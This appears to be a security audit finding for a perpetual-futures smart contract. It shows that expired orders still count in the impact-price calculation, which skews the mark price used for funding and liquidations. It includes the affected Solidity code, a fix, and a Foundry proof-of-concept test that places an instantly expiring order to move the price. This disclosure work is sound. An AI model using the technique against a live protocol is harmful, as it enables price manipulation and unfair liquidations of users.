  "body": "## Finding description and impact\n\n`_cacheImpactPrice` runs every time the admin sets mark price. The impact price average above depends on `quoteBidInQuote`/`quoteAskInQuote`, which traverse each limit via `_getBaseLimit`. During traversal, no call to `Order.isExpired()` or `_removeUnfillableOrder` happens, so expired orders remain in the queue and still contribute to `baseAmount`. Thus the impact price snapshot includes liquidity that would never execute.\n\n```solidity\n// contracts/perps/types/Market.sol:672\nfunction _cacheImpactPrice(Market storage self) private returns (uint256 impactPrice) {\n    uint256 impactNotional = uint256(500e18).\n        fullMulDiv(StorageLib.loadMarketSettings(self.asset).maxOpenLeverage, 1e18);\n    impactPrice = self.getImpactPrice(impactNotional);\n    StorageLib.loadMarketMetadata(self.asset).impactPriceHistory.snapshot(impactPrice);\n}\n```\n\n```solidity\n// contracts/perps/types/Market.sol:450\nfunction getImpactPrice(Market storage self, uint256 impactNotional) internal view returns (uint256) {\n    (uint256 baseAmount, uint256 quoteUsed) = StorageLib.loadBook(self.asset).quoteBidInQuote(impactNotional);\n    if (impactNotional > quoteUsed) baseAmount += (impactNotional - quoteUsed).fullMulDiv(1e18, type(uint256).max);\n    uint256 impactBid = baseAmount == 0 ? 0 : impactNotional.fullMulDiv(1e18, baseAmount);\n\n    (baseAmount, quoteUsed) = StorageLib.loadBook(self.asset).quoteAskInQuote(impactNotional);\n    if (impactNotional > quoteUsed) baseAmount += (impactNotional - quoteUsed).fullMulDiv(1e18, 1);\n    uint256 impactAsk = impactNotional.fullMulDiv(1e18, baseAmount);\n\n    return (impactBid + impactAsk) / 2;\n}\n```\n\n\n```solidity\n// contracts/perps/types/Book.sol:496\nfunction _getBaseLimit(Book storage self, Limit storage limit, uint256 price, uint256 quoteAmount)\n    private\n    view\n    returns (uint256 baseAmount, uint256 quoteUsed)\n{\n    uint256 numOrders = limit.numOrders;\n    OrderId orderId = limit.headOrder;\n\n    uint256 fillAmount;\n    for (uint256 i; i < numOrders; ++i) {\n        if (quoteAmount == 0) break;\n        if (orderId.unwrap() == 0) break;\n\n        fillAmount = self.orders[orderId].amount.min(quoteAmount.fullMulDiv(1e18, price));\n        baseAmount += fillAmount;\n        quoteUsed += fillAmount.fullMulDiv(price, 1e18);\n        quoteAmount -= fillAmount.fullMulDiv(price, 1e18);\n\n        orderId = self.orders[orderId].nextOrderId;\n    }\n}\n```\nBecause mark price is the median of funding component, index+basis EMA, and impact price (`Market.sol:248`), this manipulation flows straight into `markPrice`. Funding payments, liquidation checks (`ClearingHouse.assertNotLiquidatable`), minimum margin requirements, and other safety checks that rely on `markPrice` can become false.\n\n## Recommended mitigation steps\n\nWhen iterating orders for impact-price calculations, check `Order.isExpired()` and ignore those orders.",
  "proof_of_concept": "You can run `forge test --mt test_submissionValidity -vv` to run the coded POC \nIn this POC the index price (2900) never change also the midPrice never change (9500) but the mark price change because of an order that is immediately expired because since p3 is modified.\n\n```solidity\n       function test_submissionValidity() public {\n        // we set up the timestamp \n        vm.warp(1_524_785_992);\n\n        bytes32 asset = ETH;\n        uint256 sub = 1;\n       vm.startPrank(jb);\n        perpManager.deposit(jb, 1_000_000e18);\n        PlaceOrderArgs memory ask = PlaceOrderArgs({\n            subaccount: sub,\n            asset: asset,\n            side: Side.SELL,\n            limitPrice: 10_000e18,\n            amount: 100 ether,\n            baseDenominated: false,\n            tif: TiF.GTC,\n            expiryTime: uint32(0),\n            clientOrderId: 0,\n            reduceOnly: false\n        });\n        perpManager.placeOrder(jb, ask);\n        vm.stopPrank();      \n         vm.startPrank(jb);\n        perpManager.deposit(jb, 1_000_000e18);\n        PlaceOrderArgs memory askBUY = PlaceOrderArgs({\n            subaccount: sub,\n            asset: asset,\n            side: Side.BUY,\n            limitPrice: 9_000e18,\n            amount: 10 ether,\n            baseDenominated: false,\n            tif: TiF.GTC,\n            expiryTime: uint32(0),\n            clientOrderId: 0,\n            reduceOnly: false\n        });\n        perpManager.placeOrder(jb, askBUY);\n        vm.stopPrank();\n        vm.prank(admin);\n        perpManager.setMarkPrice(asset, 2900e18);\n         uint256 normalPrice = perpManager.getMarkPrice(asset);\n        vm.warp(block.timestamp +10 days);\n        perpManager.getMarkPrice(asset);\n         vm.startPrank(nate);\n        perpManager.deposit(nate, 1_000_000e18);\n        PlaceOrderArgs memory asknate = PlaceOrderArgs({\n            subaccount: sub,\n            asset: asset,\n            side: Side.SELL,\n            limitPrice: 10_000e18,\n            amount: 25_000 ether,\n            baseDenominated: false,\n            tif: TiF.GTC,\n            expiryTime: uint32(block.timestamp),\n            clientOrderId: 0,\n            reduceOnly: false\n        });\n        perpManager.placeOrder(nate, asknate);\n        vm.stopPrank();\n        vm.warp(block.timestamp +15);\n\n         vm.prank(admin);\n        perpManager.setMarkPrice(asset, 2900e18);\n\n        vm.warp(block.timestamp +10 days);\n\n        vm.prank(admin);\n        perpManager.setMarkPrice(asset, 2900e18);\n       uint256 manipulatedPrice = perpManager.getMarkPrice(asset);\n\n\n        assertLt(manipulatedPrice, normalPrice, \"expired order still skewed impact price\");\n    }\n```",
